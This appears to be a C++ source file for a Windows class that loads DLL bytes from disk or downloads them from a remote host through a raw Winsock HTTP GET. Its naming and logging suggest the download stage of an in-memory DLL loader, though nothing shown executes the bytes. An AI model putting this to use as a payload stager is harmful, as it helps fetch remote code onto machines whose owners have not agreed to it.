#include "NetworkStream.h"
#include <fstream>
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>

NetworkStream::NetworkStream() : m_winsockInitialized(false) {
    InitializeWinsock();
}

NetworkStream::~NetworkStream() {
    CleanupWinsock();
}

bool NetworkStream::InitializeWinsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "[!] WSAStartup failed: " << result << std::endl;
        return false;
    }
    m_winsockInitialized = true;
    return true;
}

void NetworkStream::CleanupWinsock() {
    if (m_winsockInitialized) {
        WSACleanup();
        m_winsockInitialized = false;
    }
}

std::vector<uint8_t> NetworkStream::FetchDLL(const char* filePath) {
    std::vector<uint8_t> buffer;
    
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "[!] Failed to open file: " << filePath << std::endl;
        return buffer;
    }
    
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    buffer.resize(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
        std::cerr << "[!] Failed to read file" << std::endl;
        buffer.clear();
        return buffer;
    }
    
    std::cout << "[+] Fetched DLL from memory buffer: " << size << " bytes" << std::endl;
    return buffer;
}

std::vector<uint8_t> NetworkStream::FetchDLLFromNetwork(const char* host, int port, const char* resource) {
    std::vector<uint8_t> buffer;
    
    if (!m_winsockInitialized) {
        std::cerr << "[!] Winsock not initialized" << std::endl;
        return buffer;
    }
    
    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "[!] Socket creation failed: " << WSAGetLastError() << std::endl;
        return buffer;
    }
    
    // Resolve host
    struct addrinfo hints = {0}, *result = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    
    std::string portStr = std::to_string(port);
    if (getaddrinfo(host, portStr.c_str(), &hints, &result) != 0) {
        std::cerr << "[!] Failed to resolve host: " << host << std::endl;
        closesocket(sock);
        return buffer;
    }
    
    // Connect
    if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        std::cerr << "[!] Connection failed: " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        closesocket(sock);
        return buffer;
    }
    
    freeaddrinfo(result);
    
    // Send HTTP GET request
    std::string request = "GET " + std::string(resource) + " HTTP/1.1\r\n";
    request += "Host: " + std::string(host) + "\r\n";
    request += "Connection: close\r\n\r\n";
    
    if (send(sock, request.c_str(), (int)request.length(), 0) == SOCKET_ERROR) {
        std::cerr << "[!] Send failed: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        return buffer;
    }
    
    // Receive response
    char recvBuf[4096];
    int bytesReceived;
    bool headersParsed = false;
    
    while ((bytesReceived = recv(sock, recvBuf, sizeof(recvBuf), 0)) > 0) {
        if (!headersParsed) {
            // Skip HTTP headers
            std::string response(recvBuf, bytesReceived);
            size_t headerEnd = response.find("\r\n\r\n");
            if (headerEnd != std::string::npos) {
                headersParsed = true;
                size_t bodyStart = headerEnd + 4;
                buffer.insert(buffer.end(), 
                    recvBuf + bodyStart, 
                    recvBuf + bytesReceived);
            }
        } else {
            buffer.insert(buffer.end(), recvBuf, recvBuf + bytesReceived);
        }
    }
    
    closesocket(sock);
    
    if (buffer.empty()) {
        std::cerr << "[!] No data received from server" << std::endl;
    } else {
        std::cout << "[+] Fetched DLL from network: " << buffer.size() << " bytes" << std::endl;
    }
    
    return buffer;
}
